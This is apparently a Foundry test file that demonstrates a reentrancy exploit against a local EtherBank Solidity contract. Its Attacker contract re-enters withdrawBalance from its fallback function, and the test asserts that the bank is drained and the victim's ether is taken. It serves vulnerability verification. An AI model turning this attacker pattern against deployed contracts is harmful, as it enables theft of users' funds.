// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherbank.sol";

contract ReentrancyTest is Test {
    EtherBank public etherBank;
    Attacker public attacker;
    uint constant ATTACKER_DEPOSIT = 1 ether;
    uint constant VICTIM_DEPOSIT = 1 ether;
    address victim = address(this);

    function setUp() public {
        etherBank = new EtherBank();
        attacker = new Attacker(etherBank);
        vm.deal(address(attacker), ATTACKER_DEPOSIT);
    }

    function testReentrancyAttack() public {
        // Victim deposits funds
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        etherBank.addToBalance{value: VICTIM_DEPOSIT}();

        // Attacker deposits funds
        vm.prank(address(attacker));
        etherBank.addToBalance{value: ATTACKER_DEPOSIT}();

        // === DIFFERENTIAL START ===
        console2.log("--- BEFORE-Trigger Attack ---");
        uint b_bankETH = address(etherBank).balance;
        uint b_attackerETH = address(attacker).balance;
        uint b_victimBankBalance = etherBank.getBalance(victim);
        uint b_attackerBankBalance = etherBank.getBalance(address(attacker));
        console2.log("Bank ETH Balance: ", b_bankETH);
        console2.log("Attacker ETH Balance: ", b_attackerETH);
        console2.log("Victim Deposit: ", b_victimBankBalance);
        console2.log("Attacker Deposit: ", b_attackerBankBalance);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack(ATTACKER_DEPOSIT);

        console2.log("--- AFTER-Trigger Attack ---");
        uint a_bankETH = address(etherBank).balance;
        uint a_attackerETH = address(attacker).balance;
        uint a_victimBankBalance = etherBank.getBalance(victim);
        uint a_attackerBankBalance = etherBank.getBalance(address(attacker));
        console2.log("Bank ETH Balance: ", a_bankETH);
        console2.log("Attacker ETH Balance: ", a_attackerETH);
        console2.log("Victim Deposit: ", a_victimBankBalance);
        console2.log("Attacker Deposit: ", a_attackerBankBalance);

        // Differential checks
        bool bankDrained = (b_bankETH != a_bankETH && a_bankETH == 0);
        bool attackerGained = (b_attackerETH != a_attackerETH && a_attackerETH == 2 ether);
        bool victimUnchanged = (b_victimBankBalance == a_victimBankBalance);
        bool attackerBalanceReset = (b_attackerBankBalance != a_attackerBankBalance && a_attackerBankBalance == 0);

        console2.log("--- Verification ---");
        console2.log("Bank drained:   ", bankDrained ? "YES" : "NO");
        console2.log("Attacker gained funds:   ", attackerGained ? "YES" : "NO");
        console2.log("Victim balance unchanged:   ", victimUnchanged ? "YES" : "NO");
        console2.log("Attacker bank balance reset:   ", attackerBalanceReset ? "YES" : "NO");

        // Final vulnerability verdict
        if(bankDrained && attackerGained && victimUnchanged && attackerBalanceReset) {
            console2.log("Vulnerability Exists: Bank ETH drained and attacker balances changed unexpectedly");
        } else {
            console2.log("Vulnerability not Exist: State changes not consistent with reentrancy vulnerability");
        }
        // === DIFFERENTIAL END ===

        // Verify bank funds drained
        uint finalBankBalance = address(etherBank).balance;
        assertEq(finalBankBalance, 0, "Bank not drained");

        // Verify attacker kept deposit + stole victim's funds
        uint attackerEthBalance = address(attacker).balance;
        assertEq(attackerEthBalance, 2 ether, "Attacker didn't get double ether");

        // Verify victim's bank balance remains
        uint victimBankBalance = etherBank.getBalance(victim);
        assertEq(victimBankBalance, VICTIM_DEPOSIT, "Victim balance affected");

        // Verify attacker's bank balance reset
        uint attackerBankBalance = etherBank.getBalance(address(attacker));
        assertEq(attackerBankBalance, 0, "Attacker bank balance not zeroed");
    }
}

contract Attacker {
    EtherBank public etherBank;
    bool reentrancyGuard;

    constructor(EtherBank _etherBank) {
        etherBank = _etherBank;
    }

    function attack(uint amount) external payable {
        etherBank.withdrawBalance();
    }

    function executeReentrancy() public {
        if (!reentrancyGuard) {
            reentrancyGuard = true;
            etherBank.withdrawBalance();
        }
    }

    fallback() external payable {
        if (msg.value > 0) {
            executeReentrancy();
        }
    }
}